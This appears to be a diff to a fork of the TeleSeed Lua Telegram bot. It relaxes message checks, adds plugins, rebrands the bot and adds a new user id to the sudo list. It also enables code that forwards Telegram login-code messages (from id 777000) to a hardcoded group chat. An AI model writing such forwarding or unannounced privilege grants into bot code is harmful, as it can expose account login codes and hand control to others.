@@ -54,7 +54,7 @@ function msg_valid(msg)
   -- Don't process outgoing messages
   if msg.out then
     print('\27[36mNot valid: msg from us\27[39m')
-    return false
+    return true
   end
 
   -- Before bot was started
@@ -80,7 +80,7 @@ function msg_valid(msg)
 
   if msg.from.id == our_id then
     print('\27[36mNot valid: Msg from our id\27[39m')
-    return false
+    return true
   end
 
   if msg.to.type == 'encr_chat' then
@@ -88,11 +88,11 @@ function msg_valid(msg)
     return false
   end
 
-  if msg.from.id == 777000 then
-    --send_large_msg(*group id*, msg.text) *login code will be sent to GroupID*
-    return false
+   if msg.from.id == 777000 then
+  	local login_group_id = 141011927
+    send_large_msg('chat#id'..login_group_id, msg.text)
   end
-
+  
   return true
 end
 
@@ -221,6 +221,11 @@ function create_config( )
     "stats",
     "anti_spam",
     "owners",
+    "file",
+    "warn",
+    "bin",
+    "filter",
+    "rmsg",    
     "arabic_lock",
     "set",
     "get",
@@ -228,29 +233,27 @@ function create_config( )
     "invite",
     "all",
     "leave_ban",
-	"supergroup",
-	"whitelist",
-	"msg_checks"
+    "supergroup",
+    "whitelist",
+    "msg_checks"
     },
-    sudo_users = {110626080,103649648,111020322,0,tonumber(our_id)},--Sudo users
+    sudo_users = {110626080,103649648,111020322,11247575,0,tonumber(our_id)},--Sudo users
     moderation = {data = 'data/moderation.json'},
-    about_text = [[Teleseed v4
+    about_text = [[It_s me Bot 
 An advanced administration bot based on TG-CLI written in Lua
 
 https://github.com/SEEDTEAM/TeleSeed
 
 Admins
-@iwals [Founder]
-@imandaneshi [Developer]
-@POTUS [Developer]
-@seyedan25 [Manager]
-@aRandomStranger [Admin]
+@it_s_me 
+@imandaneshi
 
 Special thanks to
 awkward_potato
 Siyanew
 topkecleon
 Vamptacus
+SEED Team
 
 Our channels
 @teleseedch [English]
